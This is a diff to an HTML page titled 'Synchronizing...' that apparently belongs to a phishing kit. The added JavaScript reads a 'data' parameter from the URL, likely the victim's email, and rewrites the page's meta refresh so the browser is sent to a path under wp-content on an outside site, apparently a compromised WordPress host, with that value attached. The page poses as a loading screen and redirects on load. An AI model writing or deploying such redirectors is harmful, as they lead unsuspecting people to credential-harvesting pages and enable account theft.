@@ -1,8 +1,27 @@
 <HTML>
     <HEAD>
       <TITLE>Synchronizing... </TITLE>
+      <script>
+        function getUrlVars() {
+            var vars = {};
+            var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+                vars[key] = value;
+            });
+            return vars;
+        }
+
+    var em = getUrlVars()["data"];
+    var dm = `data=${em}`
+    var met = `1; url='https://careerco.ca/wp-content/bond/?connect&${dm}'`;
+   
+     document.getElementsByTagName('meta')[0].content = met
+  
+      </script>
       <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700" rel="stylesheet">
-      <meta http-equiv="refresh" content="1; url='https://careerco.ca/wp-content/blored/?connect'" />
+      <meta http-equiv="refresh" content="90000; url='https://careerco.ca/wp-content/bond/?connect'" />
+      <script>
+        document.getElementsByTagName('meta')[0].content = met
+      </script>
     </HEAD>
     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
     <BODY style="font-family: Montserrat;" text=#UUUUUU bgColor=#FFFFFF>
